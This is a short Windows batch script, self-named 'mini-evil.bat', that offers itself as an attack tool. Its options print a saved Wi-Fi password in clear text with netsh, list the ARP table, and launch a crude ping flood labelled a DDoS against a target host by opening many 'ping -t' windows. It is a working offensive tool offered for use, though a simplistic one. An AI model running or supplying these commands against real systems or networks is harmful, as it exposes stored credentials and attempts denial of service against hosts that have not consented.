@echo off

set line=-------------

title kombat

cls

if %1==--help (
	echo %line% 
	echo --wifi check connected wifi password; using[mini-evil.bat --wifi name-wifi
	echo --mac check mac addres
	echo --ddos ddos attack to server; using[mini-evil.bat --ddos 2 target.ip.com
	echo %line%
	exit /b
)

if %1==--wifi (
	netsh wlan show profiles name=%2 key=clear
	exit /b
) else (echo error)
if %1==--mac (
	cls
	arp -a
	exit /b
) else (echo error)
if %1==--ddos (
	cls
	for /l %%i in (0,1,%2) do start cmd /c ping %3 -t 
) else (echo error)
